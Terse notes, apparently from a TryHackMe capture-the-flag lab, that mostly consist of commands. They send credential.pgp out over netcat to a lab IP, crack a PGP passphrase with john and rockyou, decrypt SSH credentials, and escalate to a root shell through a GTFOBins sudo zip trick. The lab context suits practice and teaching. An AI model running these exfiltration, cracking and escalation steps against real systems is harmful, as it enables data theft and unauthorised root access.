```
base64 credential.pgp | nc 10.9.17.195 1234
```
transfer from linux to my kali without having to do scp

get both credential.pgp and tryhackme.asc

Convert it into a format recognized by john
`gpg2john tryhackme.asc hash `
Run john on it
`john --format=gpg --wordlist=/usr/share/wordlists/rockyou.txt hash`
-get the password as alexandru

import the acs file to gpd, enter alexandru when propted for password
`gpg --import tryhackme.asc`
decrypt credential.pgp
`gpg --decrypt credential.pgp`
get merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j

ssh with this cred, and do sudo -l to discover zip doesnt need sudo pass
Goto gtfo bins, ->
```
TF=$(mktemp -u)
```
```
sudo zip $TF /etc/hosts -T -TT 'sh #'
```
